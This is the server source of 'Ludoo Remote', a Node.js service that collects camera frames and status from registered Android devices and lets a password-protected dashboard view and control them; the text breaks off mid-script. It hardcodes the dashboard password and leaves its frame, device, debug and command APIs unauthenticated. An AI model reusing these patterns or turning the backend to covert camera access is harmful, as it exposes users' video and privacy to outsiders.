const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: '*', methods: ['GET', 'POST'] },
    transports: ['websocket', 'polling']
});

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ========== AUTH ==========
const DASHBOARD_PASSWORD = 'ajaybabu95';
const SESSION_SECRET = crypto.randomBytes(32).toString('hex');
const VALID_TOKEN = crypto.createHmac('sha256', SESSION_SECRET).update(DASHBOARD_PASSWORD).digest('hex');

function parseCookies(req) {
    const raw = req.headers.cookie || '';
    return Object.fromEntries(raw.split(';').map(c => c.trim().split('=').map(decodeURIComponent)));
}
function isAuthenticated(req) {
    return parseCookies(req)['lsess'] === VALID_TOKEN;
}
function requireAuth(req, res, next) {
    if (isAuthenticated(req)) return next();
    res.redirect('/login');
}

// ========== STATE ==========
let devices = [];
let deviceHeartbeats = {};
let pendingCommands = {};
let latestFrames = {};
let deviceSettings = {};
let activeStreams = {};
let frameQueues = {};

function getDeviceSettings(deviceId) {
    if (!deviceSettings[deviceId]) {
        deviceSettings[deviceId] = { stream: false, quality: 240, fps: 15, camera: 'back' };
    }
    return deviceSettings[deviceId];
}

function findCanonicalDevice(deviceId) {
    if (!deviceId) return null;
    const exact = devices.find(d => d.id === deviceId);
    if (exact) return exact;
    let best = null, bestLen = 0;
    for (const d of devices) {
        let common = 0;
        while (common < d.id.length && common < deviceId.length && d.id[common] === deviceId[common]) common++;
        if (common > bestLen && common >= Math.min(8, d.id.length, deviceId.length)) {
            best = d; bestLen = common;
        }
    }
    return best;
}

function resolveLatestFrame(deviceId) {
    if (latestFrames[deviceId]) return latestFrames[deviceId];
    let bestFrame = null, bestLen = 0;
    for (const knownId of Object.keys(latestFrames)) {
        let common = 0;
        while (common < knownId.length && common < deviceId.length && knownId[common] === deviceId[common]) common++;
        if (common > bestLen && common >= Math.min(8, knownId.length, deviceId.length)) {
            bestFrame = latestFrames[knownId]; bestLen = common;
        }
    }
    return bestFrame || null;
}

// Cleanup stale devices every 10s (lastSeen > 20s)
setInterval(() => {
    const now = Date.now();
    devices = devices.filter(device => {
        const stale = (now - (device.lastSeen || 0)) > 20000;
        if (stale) {
            console.log(`🧹 Removing stale device: ${device.id}`);
            delete deviceHeartbeats[device.id];
            delete pendingCommands[device.id];
            delete latestFrames[device.id];
            delete deviceSettings[device.id];
            delete activeStreams[device.id];
            delete frameQueues[device.id];
            return false;
        }
        return true;
    });
}, 10000);

// ========== HTTP API ==========

// REGISTER DEVICE
app.post('/api/register', (req, res) => {
    try {
        const { deviceId, deviceName } = req.body;
        console.log(`📱 Device registered: ${deviceId} (${deviceName})`);
        let device = devices.find(d => d.id === deviceId);
        if (!device) {
            device = {
                id: deviceId,
                name: deviceName || 'Android Device',
                connectedAt: new Date().toLocaleTimeString(),
                firstSeen: Date.now(),
                lastSeen: Date.now()
            };
            devices.push(device);
        } else {
            device.lastSeen = Date.now();
        }
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// HEARTBEAT
app.post('/api/heartbeat', (req, res) => {
    try {
        const {
            deviceId, deviceName, camera, cameraReady, streaming,
            cameraPermission, batteryOptimization, batteryPercentage
        } = req.body;

        deviceHeartbeats[deviceId] = Date.now();
        let device = devices.find(d => d.id === deviceId);
        if (!device) {
            device = {
                id: deviceId,
                name: deviceName || 'Android Device',
                connectedAt: new Date().toLocaleTimeString(),
                firstSeen: Date.now()
            };
            devices.push(device);
            console.log(`✅ Device registered: ${device.name} (${deviceId})`);
        }
        device.name = deviceName || device.name;
        device.camera = camera || device.camera;
        device.cameraReady = cameraReady || false;
        device.streaming = streaming || false;
        device.cameraPermission = cameraPermission || false;
        device.batteryOptimization = batteryOptimization || false;
        device.batteryPercentage = batteryPercentage || 0;
        device.lastHeartbeat = new Date().toLocaleTimeString();
        device.lastSeen = Date.now();
        res.json({ success: true, settings: getDeviceSettings(deviceId) });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// FRAME UPLOAD (Single - HTTP fallback)
app.post('/api/frame', (req, res) => {
    try {
        const { deviceId, image, quality, fps, camera } = req.body;
        if (deviceId && image) {
            const ds = getDeviceSettings(deviceId);
            const frameData = {
                image,
                ts: Date.now(),
                quality: quality || ds.quality || 240,
                fps: fps || ds.fps || 15,
                camera: camera || ds.camera || 'back'
            };
            latestFrames[deviceId] = frameData;

            if (activeStreams[deviceId]) {
                io.to(activeStreams[deviceId]).emit('frame', {
                    deviceId,
                    image,
                    timestamp: frameData.ts
                });
            }

            const dev = devices.find(d => d.id === deviceId);
            if (dev) dev.lastSeen = Date.now();
        }
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// BATCH UPLOAD (5 frames at a time)
app.post('/api/batch', (req, res) => {
    try {
        const { deviceId, frames, count, timestamp, fps, quality } = req.body;

        console.log(`📦 Batch received: ${count} frames from ${deviceId}`);

        if (!deviceId || !frames || frames.length === 0) {
            return res.status(400).json({ success: false, error: 'Invalid batch' });
        }

        if (!frameQueues[deviceId]) {
            frameQueues[deviceId] = [];
        }

        frames.forEach((frame, index) => {
            frameQueues[deviceId].push({
                image: frame,
                ts: (timestamp || Date.now()) + index * 33
            });
        });

        if (frameQueues[deviceId].length > 30) {
            frameQueues[deviceId] = frameQueues[deviceId].slice(-30);
        }

        const latestFrame = frameQueues[deviceId][frameQueues[deviceId].length - 1];
        if (latestFrame) {
            latestFrames[deviceId] = {
                image: latestFrame.image,
                ts: latestFrame.ts,
                quality: quality || 240,
                fps: fps || 15
            };
        }

        if (latestFrame) {
            io.emit('frame', {
                deviceId,
                image: latestFrame.image,
                timestamp: latestFrame.ts
            });
        }

        const dev = devices.find(d => d.id === deviceId);
        if (dev) dev.lastSeen = Date.now();

        res.json({
            success: true,
            totalFrames: frameQueues[deviceId].length
        });

    } catch (e) {
        console.error('❌ Batch error:', e.message);
        res.status(500).json({ success: false, error: e.message });
    }
});

// FRAME FETCH
app.get('/api/frame/:deviceId', (req, res) => {
    const { deviceId } = req.params;

    const queue = frameQueues[deviceId];
    if (queue && queue.length > 0) {
        const frame = queue[queue.length - 1];
        return res.json({ success: true, image: frame.image, ts: frame.ts });
    }

    const frame = resolveLatestFrame(deviceId);
    if (!frame) return res.json({ success: false, image: null });
    res.json({ success: true, image: frame.image, ts: frame.ts });
});

// COMMAND SEND
app.post('/api/command', (req, res) => {
    try {
        const { deviceId, command, value } = req.body;
        console.log(`📡 HTTP Command: [${command}] for [${deviceId}]`);

        const ds = getDeviceSettings(deviceId);
        switch (command) {
            case 'start':   ds.stream = true; break;
            case 'stop':    ds.stream = false; break;
            case 'flip':    ds.camera = ds.camera === 'back' ? 'front' : 'back'; break;
            case 'quality': ds.quality = value || 240; break;
            case 'fps':     ds.fps = value || 15; break;
            default: console.log(`⚠️ Unknown command: ${command}`);
        }

        const cmd = { command, value: value ?? null };

        if (deviceId) {
            if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
            pendingCommands[deviceId].push(cmd);
            console.log(`📋 Command queued for HTTP poll: ${command}`);
        }

        res.json({ success: true, settings: getDeviceSettings(deviceId) });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// COMMAND POLL (Android polls this)
app.get('/api/commands/:deviceId', (req, res) => {
    try {
        const { deviceId } = req.params;
        deviceHeartbeats[deviceId] = Date.now();

        if (!findCanonicalDevice(deviceId)) {
            devices.push({ id: deviceId, name: deviceId, connectedAt: new Date().toLocaleTimeString(), firstSeen: Date.now(), lastHeartbeat: new Date().toLocaleTimeString(), lastSeen: Date.now() });
            console.log(`📱 Auto-registered: ${deviceId}`);
        }

        let cmds = [];
        if (pendingCommands[deviceId] && pendingCommands[deviceId].length > 0) {
            cmds = pendingCommands[deviceId].map(c => c.command);
            pendingCommands[deviceId] = [];
        }

        if (cmds.length > 0) {
            console.log(`✅ HTTP Poll delivered ${cmds.length} commands to ${deviceId}`);
        }

        res.json({
            success: true,
            settings: getDeviceSettings(deviceId),
            commands: cmds
        });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// DEVICE STATUS UPDATE
app.post('/api/device-status', (req, res) => {
    try {
        const { deviceId, cameraReady, streaming, cameraType, cameraPermission, status } = req.body;
        let device = devices.find(d => d.id === deviceId);
        if (device) {
            if (cameraReady !== undefined) device.cameraReady = cameraReady;
            if (streaming !== undefined) device.streaming = streaming;
            if (cameraType) device.camera = cameraType;
            if (cameraPermission !== undefined) device.cameraPermission = cameraPermission;
            device.status = status;
            device.lastUpdate = new Date().toLocaleTimeString();
        }
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// DEVICES LIST
app.get('/api/devices', (req, res) => {
    const now = Date.now();
    res.json({
        success: true,
        devices: devices.map(d => ({
            id: d.id,
            name: d.name,
            camera: d.camera || 'back',
            cameraReady: d.cameraReady || false,
            streaming: d.streaming || false,
            cameraPermission: d.cameraPermission || false,
            batteryOptimization: d.batteryOptimization || false,
            batteryPercentage: d.batteryPercentage || 0,
            isConnected: (now - (d.lastSeen || 0)) < 20000,
            hasWebSocket: !!activeStreams[d.id],
            lastHeartbeat: d.lastHeartbeat,
            connectedAt: d.connectedAt,
            settings: getDeviceSettings(d.id)
        }))
    });
});

// DEVICE DETAIL
app.get('/api/device/:deviceId', (req, res) => {
    const device = devices.find(d => d.id === req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Not found' });
    const now = Date.now();
    res.json({
        success: true,
        device: {
            ...device,
            isConnected: (now - (device.lastSeen || 0)) < 20000,
            hasWebSocket: !!activeStreams[device.id],
            settings: getDeviceSettings(device.id)
        }
    });
});

// HEALTH
app.get('/api/health', (req, res) => res.json({
    status: 'ok',
    devices: devices.length,
    uptime: process.uptime(),
    frames: Object.keys(latestFrames).length,
    batchFrames: Object.keys(frameQueues).reduce((acc, key) => acc + (frameQueues[key]?.length || 0), 0),
    commands: Object.keys(pendingCommands).reduce((acc, key) => acc + pendingCommands[key].length, 0)
}));

// DEBUG
app.get('/api/debug', (req, res) => {
    res.json({
        devices: devices.map(d => d.id),
        activeStreams,
        pendingCommands,
        frameQueues: Object.keys(frameQueues).reduce((acc, key) => {
            acc[key] = frameQueues[key]?.length || 0;
            return acc;
        }, {}),
        heartbeats: Object.fromEntries(
            Object.entries(deviceHeartbeats).map(([k, v]) => [k, `${Math.round((Date.now() - v) / 1000)}s ago`])
        )
    });
});

// LOGIN API (for Android app)
app.post('/api/login', (req, res) => {
    const { password } = req.body;
    if (password === DASHBOARD_PASSWORD) {
        return res.json({ success: true });
    }
    res.status(401).json({ success: false, error: 'Wrong password' });
});

app.get('/api/settings', (req, res) => res.json({ success: true, settings: { stream: false, quality: 240, fps: 15 } }));

app.get('/favicon.ico', (req, res) => res.status(204).end());

// ========== WEBSOCKET ==========

io.on('connection', (socket) => {
    console.log(`🔌 WS connected: ${socket.id}`);

    socket.on('register_stream', (data) => {
        const { deviceId, deviceName, cameraReady, cameraPermission, batteryOptimization } = data;

        const canonical = findCanonicalDevice(deviceId);
        const canonicalId = canonical ? canonical.id : deviceId;

        let device = devices.find(d => d.id === canonicalId);
        if (!device) {
            device = {
                id: canonicalId,
                name: deviceName || 'Android Device',
                connectedAt: new Date().toLocaleTimeString(),
                firstSeen: Date.now()
            };
            devices.push(device);
        }
        if (deviceName) device.name = deviceName;
        if (cameraReady !== undefined) device.cameraReady = cameraReady;
        if (cameraPermission !== undefined) device.cameraPermission = cameraPermission;
        if (batteryOptimization !== undefined) device.batteryOptimization = batteryOptimization;
        device.lastHeartbeat = new Date().toLocaleTimeString();
        device.lastSeen = Date.now();

        socket.deviceId = canonicalId;
        socket.join('streamers');

        console.log(`📡 Device [${canonicalId}] registered for WebSocket stream`);
        socket.emit('settings', getDeviceSettings(canonicalId));

        io.emit('device_update', {
            id: device.id, name: device.name,
            cameraReady: device.cameraReady || false,
            streaming: device.streaming || false,
            cameraPermission: device.cameraPermission || false,
            batteryOptimization: device.batteryOptimization || false,
            batteryPercentage: device.batteryPercentage || 0,
            isConnected: true, hasWebSocket: true,
            lastHeartbeat: device.lastHeartbeat, connectedAt: device.connectedAt
        });
    });

    socket.on('device_status_update', (data) => {
        const canonicalId = socket.deviceId;
        if (!canonicalId) return;
        const device = devices.find(d => d.id === canonicalId);
        if (!device) return;

        const { cameraReady, cameraPermission, batteryOptimization, batteryPercentage, streaming } = data;
        if (cameraReady !== undefined) device.cameraReady = cameraReady;
        if (cameraPermission !== undefined) device.cameraPermission = cameraPermission;
        if (batteryOptimization !== undefined) device.batteryOptimization = batteryOptimization;
        if (batteryPercentage !== undefined) device.batteryPercentage = batteryPercentage;
        if (streaming !== undefined) device.streaming = streaming;
        device.lastSeen = Date.now();

        console.log(`🔄 Status update [${canonicalId}]: cam=${cameraPermission} batt=${batteryOptimization}`);
        io.emit('device_update', {
            id: device.id, name: device.name,
            cameraReady: device.cameraReady || false,
            streaming: device.streaming || false,
            cameraPermission: device.cameraPermission || false,
            batteryOptimization: device.batteryOptimization || false,
            batteryPercentage: device.batteryPercentage || 0,
            isConnected: true, hasWebSocket: true,
            lastHeartbeat: device.lastHeartbeat, connectedAt: device.connectedAt
        });
    });

    socket.on('stream_frame', (data) => {
        const { deviceId, image, timestamp, quality, fps, camera } = data;
        const canonicalId = socket.deviceId || deviceId;

        const dev = devices.find(d => d.id === canonicalId);
        if (dev) dev.lastSeen = Date.now();

        if (canonicalId && image) {
            const ds = getDeviceSettings(canonicalId);
            const frameData = {
                image,
                ts: timestamp || Date.now(),
                quality: quality || ds.quality || 240,
                fps: fps || ds.fps || 15,
                camera: camera || ds.camera || 'back'
            };
            latestFrames[canonicalId] = frameData;

            if (!frameQueues[canonicalId]) frameQueues[canonicalId] = [];
            frameQueues[canonicalId].push({ image, ts: frameData.ts });
            if (frameQueues[canonicalId].length > 30) {
                frameQueues[canonicalId] = frameQueues[canonicalId].slice(-30);
            }

            activeStreams[canonicalId] = socket.id;

            socket.broadcast.emit('frame', {
                deviceId: canonicalId,
                image,
                timestamp: frameData.ts
            });
        }
    });

    socket.on('subscribe_stream', (data) => {
        const { deviceId } = data;
        if (deviceId) {
            socket.join(`stream_${deviceId}`);
            console.log(`📺 Dashboard subscribed to ${deviceId}`);

            const queue = frameQueues[deviceId];
            if (queue && queue.length > 0) {
                const frame = queue[queue.length - 1];
                socket.emit('frame', { deviceId, image: frame.image, timestamp: frame.ts });
                return;
            }

            const frame = resolveLatestFrame(deviceId);
            if (frame) {
                socket.emit('frame', { deviceId, image: frame.image, timestamp: frame.ts });
            }
        }
    });

    // Dashboard sends command via WebSocket
    socket.on('send_command', (data) => {
        const { deviceId, command, value } = data;

        const ds = getDeviceSettings(deviceId);
        switch (command) {
            case 'start':   ds.stream = true; break;
            case 'stop':    ds.stream = false; break;
            case 'flip':    ds.camera = ds.camera === 'back' ? 'front' : 'back'; break;
            case 'quality': ds.quality = value || 240; break;
            case 'fps':     ds.fps = value || 15; break;
            default: console.log(`⚠️ Unknown WS command: ${command}`);
        }

        const cmd = { command, value: value ?? null };

        if (deviceId) {
            if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
            pendingCommands[deviceId].push(cmd);
        }

        console.log(`⚡ WS Command [${command}] queued for device [${deviceId}]`);
    });

    socket.on('disconnect', () => {
        if (socket.deviceId) {
            const disconnectedId = socket.deviceId;
            setTimeout(() => {
                if (activeStreams[disconnectedId] === socket.id) {
                    delete activeStreams[disconnectedId];
                    console.log(`📴 Device [${disconnectedId}] WS stream ended`);
                }
            }, 8000);
            console.log(`⚠️  Device [${disconnectedId}] WS drop — waiting 8s for reconnect`);
        } else {
            console.log(`🔌 WS client disconnected: ${socket.id}`);
        }
    });
});

// ========== LOGIN / LOGOUT ==========
app.get('/login', (req, res) => {
    if (isAuthenticated(req)) return res.redirect('/');
    const err = req.query.err ? '<p style="color:#f44336;margin-top:12px;font-size:13px;">❌ Wrong password. Try again.</p>' : '';
    res.send(`<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ludoo Remote — Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#0a0a0a;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;}
.card{background:#1a1a1a;border-radius:20px;padding:36px 28px;width:90%;max-width:360px;border:1px solid #2a2a2a;text-align:center;}
h1{font-size:28px;margin-bottom:4px;}
.sub{color:#666;font-size:13px;margin-bottom:28px;}
input{width:100%;padding:14px 16px;background:#0a0a0a;border:1px solid #333;border-radius:12px;color:#fff;font-size:15px;margin-bottom:16px;outline:none;transition:border .2s;letter-spacing:2px;}
input:focus{border-color:#667eea;}
button{width:100%;padding:14px;background:linear-gradient(135deg,#667eea,#764ba2);border:none;border-radius:12px;color:#fff;font-size:15px;font-weight:600;cursor:pointer;transition:opacity .2s;}
button:hover{opacity:.88;}
.lock{font-size:48px;margin-bottom:16px;}
</style>
</head>
<body>
<div class="card">
  <div class="lock">🔐</div>
  <h1>Ludoo Remote</h1>
  <p class="sub">Enter password to access dashboard</p>
  <form method="POST" action="/login">
    <input type="password" name="password" placeholder="Password" autofocus autocomplete="current-password">
    <button type="submit">Unlock →</button>
  </form>
  ${err}
</div>
</body>
</html>`);
});

app.post('/login', (req, res) => {
    if (req.body.password === DASHBOARD_PASSWORD) {
        const maxAge = 7 * 24 * 60 * 60;
        res.setHeader('Set-Cookie', `lsess=${VALID_TOKEN}; HttpOnly; SameSite=Strict; Max-Age=${maxAge}; Path=/`);
        return res.redirect('/');
    }
    res.redirect('/login?err=1');
});

app.get('/logout', (req, res) => {
    res.setHeader('Set-Cookie', 'lsess=; HttpOnly; SameSite=Strict; Max-Age=0; Path=/');
    res.redirect('/login');
});

// ========== WEB INTERFACE ==========
app.get('/', requireAuth, (req, res) => {
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Ludoo Camera Remote</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#0a0a0a; min-height:100vh; padding:20px; color:#fff; }
        .container { max-width:600px; margin:0 auto; }
        .header { text-align:center; margin-bottom:20px; }
        .header h1 { font-size:24px; background:linear-gradient(135deg,#667eea,#764ba2); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        .header p { font-size:12px; color:#666; margin-top:5px; }
        .stats { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; margin-bottom:20px; }
        .stat-card { background:#1a1a1a; border-radius:12px; padding:12px; text-align:center; border:1px solid #2a2a2a; }
        .stat-label { font-size:11px; color:#888; margin-bottom:5px; }
        .stat-value { font-size:20px; font-weight:700; }
        .stat-value.online { color:#4CAF50; }
        .ws-badge { display:inline-block; font-size:10px; padding:2px 7px; border-radius:20px; background:#1e3a1e; color:#4CAF50; border:1px solid #2d5a2d; margin-left:6px; vertical-align:middle; }
        .ws-badge.off { background:#3a1e1e; color:#f44336; border-color:#5a2d2d; }
        .video-container { background:#000; border-radius:16px; overflow:hidden; aspect-ratio:16/9; margin-bottom:20px; border:1px solid #2a2a2a; display:flex; align-items:center; justify-content:center; position:relative; }
        #video { width:100%; height:100%; object-fit:cover; display:none; }
        .video-placeholder { text-align:center; color:#555; }
        .video-placeholder span { font-size:48px; }
        .disconnected-overlay { display:none; position:absolute; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,.55); align-items:center; justify-content:center; flex-direction:column; gap:8px; z-index:5; pointer-events:none; }
        .disconnected-overlay.show { display:flex; }
        .disconnected-overlay span { font-size:13px; color:#f44336; font-weight:600; letter-spacing:1px; }
        .expand-btn { position:absolute; bottom:12px; right:12px; background:rgba(0,0,0,.6); border:none; color:white; font-size:18px; width:36px; height:36px; border-radius:50%; cursor:pointer; z-index:10; transition:all .2s; display:flex; align-items:center; justify-content:center; }
        .expand-btn:hover { background:rgba(102,126,234,.8); transform:scale(1.05); }
        .video-overlay { display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,.92); z-index:2000; align-items:center; justify-content:center; }
        .video-overlay.active { display:flex; }
        .overlay-video-wrap { position:relative; overflow:hidden; border-radius:12px; touch-action:none; user-select:none; min-width:120px; min-height:80px; }
        #overlayVideo { display:block; width:100%; height:100%; object-fit:contain; transform-origin:center center; pointer-events:none; }
        .overlay-corner-btn { position:absolute; top:10px; z-index:10; background:rgba(0,0,0,.65); border:1px solid rgba(255,255,255,.18); color:#fff; font-size:13px; padding:7px 13px; border-radius:20px; cursor:pointer; backdrop-filter:blur(4px); transition:all .2s; display:flex; align-items:center; gap:5px; white-space:nowrap; }
        .overlay-corner-btn:hover { background:rgba(102,126,234,.85); border-color:#667eea; }
        .overlay-corner-btn.rotate-btn { left:10px; }
        .overlay-corner-btn.close-btn { right:10px; border-color:rgba(244,67,54,.5); color:#ff6b6b; }
        .overlay-corner-btn.close-btn:hover { background:rgba(244,67,54,.85); color:#fff; border-color:#f44336; }
        .overlay-resize-handle { position:absolute; bottom:0; right:0; width:28px; height:28px; cursor:nwse-resize; z-index:11; display:flex; align-items:flex-end; justify-content:flex-end; padding:4px; }
        .overlay-resize-handle::after { content:''; display:block; width:14px; height:14px; border-right:3px solid rgba(255,255,255,.45); border-bottom:3px solid rgba(255,255,255,.45); border-radius:2px; }
        .controls { background:#1a1a1a; border-radius:16px; padding:16px; margin-bottom:20px; border:1px solid #2a2a2a; }
        .section-title { font-size:12px; color:#888; margin-bottom:12px; letter-spacing:1px; }
        .button-group { display:flex; gap:12px; margin-bottom:20px; flex-wrap:wrap; }
        .btn { padding:12px 20px; border:none; border-radius:12px; font-size:14px; font-weight:600; cursor:pointer; transition:all .2s; }
        .btn-start { background:#4CAF50; color:white; } .btn-start:hover { background:#45a049; }
        .btn-stop { background:#f44336; color:white; } .btn-stop:hover { background:#da190b; }
        .btn-flip { background:#2196F3; color:white; } .btn-flip:hover { background:#0b7dda; }
        .quality-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:8px; margin-bottom:20px; }
        .quality-btn { padding:10px; border:1px solid #2a2a2a; background:#0a0a0a; color:#fff; border-radius:10px; cursor:pointer; font-size:12px; text-align:center; }
        .quality-btn.active { background:#667eea; border-color:#667eea; }
        .fps-control { margin-top:16px; }
        .fps-slider { width:100%; height:4px; -webkit-appearance:none; background:#2a2a2a; border-radius:2px; margin:10px 0; }
        .fps-slider::-webkit-slider-thumb { -webkit-appearance:none; width:16px; height:16px; background:#667eea; border-radius:50%; cursor:pointer; }
        .fps-value { text-align:center; font-size:12px; color:#888; }
        .devices { background:#1a1a1a; border-radius:16px; padding:16px; border:1px solid #2a2a2a; }
        .device-item { display:flex; justify-content:space-between; align-items:center; padding:12px 10px; cursor:pointer; transition:background .2s; border-radius:8px; margin:2px 0; }
        .device-item:hover { background:#252525; }
        .device-item.selected { background:#1e1e3a; border:1px solid #667eea; }
        .device-name { font-size:14px; font-weight:500; }
        .device-status-dot { width:10px; height:10px; border-radius:50%; margin-left:10px; }
        .status-connected { background:#4CAF50; box-shadow:0 0 5px #4CAF50; }
        .empty-devices { text-align:center; color:#555; padding:20px; }
        .status-modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.85); z-index:1000; justify-content:center; align-items:center; }
        .status-modal-content { background:#1a1a1a; border-radius:20px; width:90%; max-width:350px; padding:20px; border:1px solid #667eea; }
        .status-modal-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:16px; padding-bottom:12px; border-bottom:1px solid #2a2a2a; }
        .status-modal-title { font-size:18px; font-weight:600; }
        .status-modal-close { background:none; border:none; color:#888; font-size:24px; cursor:pointer; }
        .status-item { display:flex; justify-content:space-between; align-items:center; padding:10px 0; border-bottom:1px solid #2a2a2a; font-size:14px; }
        .status-item:last-child { border-bottom:none; }
        .status-label { color:#888; }
        .status-allowed { color:#4CAF50; font-weight:600; }
        .status-denied { color:#f44336; font-weight:600; }
        .status-pending { color:#FF9800; font-weight:600; }
        .battery-bar-small { height:6px; background:#2a2a2a; border-radius:3px; overflow:hidden; width:100px; }
        .battery-fill-small { height:100%; background:linear-gradient(90deg,#4CAF50,#8BC34A); border-radius:3px; }
        .flex-row { display:flex; align-items:center; gap:10px; }
        .logout-btn { position:absolute; top:0; right:0; background:none; border:1px solid #333; color:#666; font-size:11px; padding:5px 11px; border-radius:20px; cursor:pointer; transition:all .2s; text-decoration:none; }
        .logout-btn:hover { border-color:#f44336; color:#f44336; }
        .header { position:relative; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>📹 Ludoo Remote</h1>
        <p id="connMode">Tap on device to view status</p>
        <a href="/logout" class="logout-btn">🔒 Logout</a>
    </div>
    <div class="stats">
        <div class="stat-card"><div class="stat-label">STATUS</div><div class="stat-value online" id="serverStatus">● Online</div></div>
        <div class="stat-card"><div class="stat-label">DEVICES</div><div class="stat-value" id="deviceCount">0</div></div>
        <div class="stat-card"><div class="stat-label">FPS</div><div class="stat-value" id="fpsCount">0</div></div>
    </div>
    <div class="video-container" id="videoContainer">
        <img id="video"><div id="placeholder" class="video-placeholder"><span>📷</span><br>Select a device first</div>
        <div class="disconnected-overlay" id="disconnectedOverlay"><span>⚠ DEVICE DISCONNECTED</span><span style="font-size:11px;color:#888;font-weight:400">Last frame frozen — waiting to reconnect...</span></div>
        <button class="expand-btn" id="expandBtn" title="Expand">⛶</button>
    </div>
    <div class="video-overlay" id="videoOverlay">
        <div class="overlay-video-wrap" id="overlayWrap">
            <img id="overlayVideo" src="" style="display:none;">
            <div id="overlayPlaceholder" class="video-placeholder" style="display:flex;align-items:center;justify-content:center;height:100%;background:#000;"><div><span style="font-size:36px;">📷</span><br>No stream</div></div>
            <button class="overlay-corner-btn rotate-btn" id="rotateBtn">🔄 Rotate</button>
            <button class="overlay-corner-btn close-btn" id="overlayCloseBtn">✕ Close</button>
            <div class="overlay-resize-handle" id="overlayResizeHandle"></div>
        </div>
    </div>
    <div class="controls">
        <div class="section-title">🎮 CONTROLS</div>
        <div class="button-group"><button class="btn btn-start" id="startBtn">▶ START</button><button class="btn btn-stop" id="stopBtn">⏹ STOP</button><button class="btn btn-flip" id="flipBtn">🔄 FLIP</button></div>
        <div class="section-title">📐 QUALITY</div>
        <div class="quality-grid"><button class="quality-btn" data-quality="120">120p</button><button class="quality-btn" data-quality="140">140p</button><button class="quality-btn active" data-quality="240">240p</button><button class="quality-btn" data-quality="360">360p</button></div>
        <div class="fps-control"><div class="section-title">⚡ FPS</div><input type="range" id="fpsSlider" min="5" max="30" value="15" step="1" class="fps-slider"><div class="fps-value" id="fpsLabel">15 FPS (Recommended)</div></div>
    </div>
    <div class="devices"><div class="section-title">📱 CONNECTED DEVICES</div><div id="devicesList"><div class="empty-devices">No devices connected</div></div></div>
</div>
<div id="statusModal" class="status-modal">
    <div class="status-modal-content">
        <div class="status-modal-header"><span class="status-modal-title" id="modalDeviceName">Device</span><button class="status-modal-close" onclick="closeStatusModal()">✕</button></div>
        <div id="modalContent"></div>
    </div>
</div>
<script src="/socket.io/socket.io.js"></script>
<script>
    const socket = io({ transports: ['websocket', 'polling'] });
    let wsReady = false;

    socket.on('connect', () => {
        wsReady = true;
        document.getElementById('connMode').textContent = '⚡ WebSocket connected';
    });
    socket.on('disconnect', () => {
        wsReady = false;
        document.getElementById('connMode').textContent = '⚠ WebSocket disconnected — using HTTP';
    });

    socket.on('device_update', (data) => {
        const idx = currentDevices.findIndex(d => d.id === data.id);
        if (idx !== -1) {
            currentDevices[idx] = { ...currentDevices[idx], ...data };
        } else {
            currentDevices.push(data);
        }
        renderDeviceList();
        if (selectedDeviceId === data.id) checkSelectedDeviceStatus(currentDevices);
    });

    socket.on('frame', (data) => {
        if (!isStreaming || !data.image) return;
        const idMatch = data.deviceId === selectedDeviceId;
        const singleDevice = currentDevices.filter(d => d.isConnected).length <= 1;
        if (!idMatch && !singleDevice) return;
        if ((data.timestamp || 0) <= lastFrameTs) return;
        lastFrameTs = data.timestamp || Date.now();
        updateFrame('data:image/jpeg;base64,' + data.image);
    });

    let selectedDeviceId = null, currentDevices = [], isStreaming = false, wasStreaming = false;
    let userStoppedStream = false;
    let frameCount = 0, lastFpsUpdate = Date.now(), framePollTimer = null, lastFrameTs = 0;

    const video = document.getElementById('video'),
          placeholder = document.getElementById('placeholder'),
          deviceCountSpan = document.getElementById('deviceCount'),
          fpsCountSpan = document.getElementById('fpsCount'),
          devicesList = document.getElementById('devicesList'),
          fpsSlider = document.getElementById('fpsSlider'),
          fpsLabel = document.getElementById('fpsLabel'),
          disconnectedOverlay = document.getElementById('disconnectedOverlay'),
          overlayVideo = document.getElementById('overlayVideo'),
          overlayPlaceholder = document.getElementById('overlayPlaceholder'),
          overlayWrap = document.getElementById('overlayWrap'),
          videoOverlay = document.getElementById('videoOverlay');

    function updateFrame(src) {
        video.src = src;
        video.style.display = 'block';
        placeholder.style.display = 'none';
        disconnectedOverlay.classList.remove('show');
        if (!userStoppedStream) wasStreaming = true;
        if (videoOverlay.classList.contains('active')) {
            overlayVideo.src = src;
            overlayVideo.style.display = 'block';
            overlayPlaceholder.style.display = 'none';
        }
        frameCount++;
        const now = Date.now();
        if (now - lastFpsUpdate >= 1000) {
            fpsCountSpan.textContent = frameCount;
            frameCount = 0;
            lastFpsUpdate = now;
        }
    }

    function startFramePoll() {
        stopFramePoll();
